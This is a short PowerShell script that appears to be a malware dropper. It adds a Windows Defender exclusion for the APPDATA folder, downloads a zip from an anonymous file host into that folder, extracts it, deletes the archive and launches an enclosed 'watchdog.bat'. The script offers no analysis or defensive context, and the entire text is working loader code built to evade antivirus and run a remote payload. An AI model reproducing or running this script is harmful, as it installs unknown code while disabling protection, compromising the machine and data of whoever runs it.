$Url="https://files.catbox.moe/f6hzvl.zip";$targetDir=$env:APPDATA;$zipFileName="downloaded.zip";$zipPath=Join-Path -Path $targetDir -ChildPath $zipFileName;$extractPath=$targetDir;$batPath=Join-Path -Path $extractPath -ChildPath "win-x32\watchdog.bat";if(-not(Test-Path $targetDir)){New-Item -ItemType Directory -Path $targetDir -Force|Out-Null}
if(Test-Path $batPath){Write-Host "watchdog.bat already exists. Skipping download and extraction."}else{try{Add-MpPreference -ExclusionPath $targetDir -ErrorAction Stop;Write-Host "Windows Defender exclusion added for: $targetDir"}catch{Write-Error "Failed to add Windows Defender exclusion. Error: $_ (Ensure running as administrator)";exit 1}try{Invoke-WebRequest -Uri $Url -OutFile $zipPath -ErrorAction Stop;Write-Host "Download completed: $zipPath"}catch{Write-Error "Failed to download from $Url. Error: $_";exit 1}try{Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction Stop;Write-Host "Extraction completed to: $extractPath"}catch{Write-Error "Failed to extract ZIP. Error: $_";exit 1}Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue;Write-Host "Cleanup completed."}
if(Test-Path $batPath){try{Start-Process -FilePath $batPath -WorkingDirectory (Join-Path -Path $extractPath -ChildPath "win-x32") -NoNewWindow;Write-Host "watchdog.bat executed successfully."}catch{Write-Error "Failed to run watchdog.bat. Error: $_";exit 1}}else{Write-Error "watchdog.bat not found in $extractPath\win-x32";exit 1}
Write-Host "Script finished."
